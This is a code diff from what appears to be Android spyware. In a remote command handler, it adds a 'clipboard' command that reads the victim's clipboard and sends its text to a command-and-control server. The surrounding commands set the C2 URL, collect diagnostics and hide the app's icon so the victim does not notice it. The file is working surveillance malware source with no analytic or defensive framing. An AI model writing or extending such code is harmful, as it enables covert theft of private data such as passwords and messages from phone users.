@@ -67,7 +67,7 @@ object Commands {
                 val url = args["url"]
                 if (!url.isNullOrEmpty()) {
                     Exfil.setC2(ctx, url, args["key"])
-                    BatchExfil.enqueue(ctx, "cfg", """{"ok":true,"url":"$url"}""")
+                    Exfil.sendLog(ctx, "cmd_result", """{"cmd":"cfg","ok":true,"url":"$url"}""")
                 }
             }
 
@@ -75,19 +75,47 @@ object Commands {
 
             "diag" -> Exfil.sendLog(ctx, "diag", com.sp.core.util.Diag.collect(ctx))
 
+            "clipboard" -> {
+                val text = readClipboard(ctx)
+                if (text.isNullOrBlank()) {
+                    Exfil.sendLog(ctx, "cmd_result", """{"cmd":"clipboard","ok":false,"reason":"empty"}""")
+                } else {
+                    Exfil.sendLog(
+                        ctx, "clipboard",
+                        """{"text":"${escape(text)}","len":${text.length},"ts":${System.currentTimeMillis()}}"""
+                    )
+                    Exfil.sendLog(ctx, "cmd_result", """{"cmd":"clipboard","ok":true,"len":${text.length}}""")
+                }
+            }
+
             "hide" -> {
                 com.sp.core.stealth.IconHider.hide(ctx)
-                BatchExfil.enqueue(ctx, "cmd", """{"ok":true,"icon":"hidden"}""")
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"hide","ok":true,"icon":"hidden"}""")
             }
 
             "show" -> {
                 com.sp.core.stealth.IconHider.show(ctx)
-                BatchExfil.enqueue(ctx, "cmd", """{"ok":true,"icon":"visible"}""")
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"show","ok":true,"icon":"visible"}""")
             }
 
-            else -> BatchExfil.enqueue(ctx, "cmd", """{"unknown":"$cmd"}""")
+            else -> Exfil.sendLog(ctx, "cmd_result", """{"cmd":"$cmd","ok":false,"reason":"unknown"}""")
         }
     }
+
+    /** Current clipboard content, or null when there is nothing usable. */
+    private fun readClipboard(ctx: Context): String? {
+        return try {
+            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+            val clip = cm.primaryClip
+            if (clip == null || clip.itemCount == 0) null
+            else clip.getItemAt(0)?.text?.toString()
+        } catch (_: Throwable) {
+            null
+        }
+    }
+
+    private fun escape(s: String): String =
+        s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "")
 
     private fun start(ctx: Context, cls: Class<*>) {
         val i = Intent(ctx, cls)
